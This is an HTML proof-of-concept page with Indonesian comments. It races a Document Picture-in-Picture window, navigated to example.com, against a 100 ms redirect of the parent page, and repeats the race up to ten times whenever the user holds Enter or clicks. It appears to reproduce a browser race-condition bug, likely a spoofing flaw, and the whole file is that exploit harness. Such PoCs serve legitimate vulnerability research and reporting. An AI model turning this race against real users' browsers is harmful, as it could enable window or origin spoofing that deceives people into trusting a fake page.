<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PiP + Redirect Race Upgrade</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
  h1 { color: #4285f4; margin-bottom: 20px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  #status { font-family: monospace; font-size: 12px; color: #999; margin-top: 20px; }
</style>
</head>
<body>

<h1>Hold Enter</h1>
<p>Press and hold Enter to trigger PiP + Redirect race.</p>
<div id="status">[*] Ready...</div>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');
  var counter = 0;
  var maxAttempts = 10;

  function log(msg) {
    statusEl.textContent = msg;
    console.log("[PiP Race] " + msg);
  }

  // ============================================
  // 1. FUNGSI UTAMA: PiP + REDIRECT RACE
  // ============================================
  async function triggerRace() {
    if (counter >= maxAttempts) {
      log("[!] Max attempts reached: " + counter);
      return;
    }
    counter++;
    log("[*] Attempt #" + counter);

    // ============================================
    // A. BUKA PiP (ASYNC) DAN REDIRECT (LANGSUNG)
    // ============================================
    
    // 1. Buka PiP
    const pipPromise = documentPictureInPicture.requestWindow({
      width: 600,
      height: 400
    }).then(pipWindow => {
      // Navigasi PiP ke example.com
      pipWindow.location.href = 'https://example.com';
      return pipWindow;
    }).catch(err => {
      log("PiP Error: " + err.message);
      return null;
    });

    // 2. REDIRECT PARENT (LANGSUNG, 0ms)
    setTimeout(() => {
      log("[*] Redirecting parent to google.com/x...");
      window.location.href = 'https://google.com/x';
    }, 100); // 100ms delay (sesuai kode asli, bisa diubah)

    // 3. Tunggu PiP siap (tidak blocking)
    pipPromise.then(pipWindow => {
      if (pipWindow) {
        log("[+] PiP opened and navigated to example.com");
      }
    });
  }

  // ============================================
  // 2. KEYPRESS LISTENER (HOLD ENTER)
  // ============================================
  document.body.onkeypress = function(e) {
    if (e.key === 'Enter') {
      triggerRace();
    }
  };

  // ============================================
  // 3. TOMBOL UNTUK MEMUDAHKAN (OPSIONAL)
  // ============================================
  document.body.addEventListener('click', function() {
    triggerRace();
  }, { once: false });

})();
</script>

</body>
</html>
